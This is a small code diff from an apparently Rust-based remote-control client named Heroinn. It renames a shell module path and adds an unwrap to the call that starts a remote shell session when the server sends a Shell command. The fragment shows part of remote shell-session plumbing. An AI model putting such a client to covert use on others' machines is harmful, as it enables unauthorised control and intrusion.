@@ -9,7 +9,7 @@ use lazy_static::*;
 
 mod module;
 
-use module::shell::ShellClient;
+use module::Shell::ShellClient;
 
 lazy_static!{
     static ref G_OUT_BYTES : Arc<AtomicU64> = Arc::new(AtomicU64::new(0));
@@ -206,7 +206,7 @@ fn main() {
                     match HeroinnServerCommandID::from(buf[0]){
                         HeroinnServerCommandID::Shell => {
                             let msg = Message::new(client.local_addr().unwrap() , HeroinnProtocol::TCP , &buf).unwrap();
-                            let session = ShellClient::new_client(session_sender.clone(), &clientid , &msg.parser_sessionpacket().unwrap().id);
+                            let session = ShellClient::new_client(session_sender.clone(), &clientid , &msg.parser_sessionpacket().unwrap().id).unwrap();
                             shell_session_mgr.lock().unwrap().register(session);
                         },
                         HeroinnServerCommandID::File => {
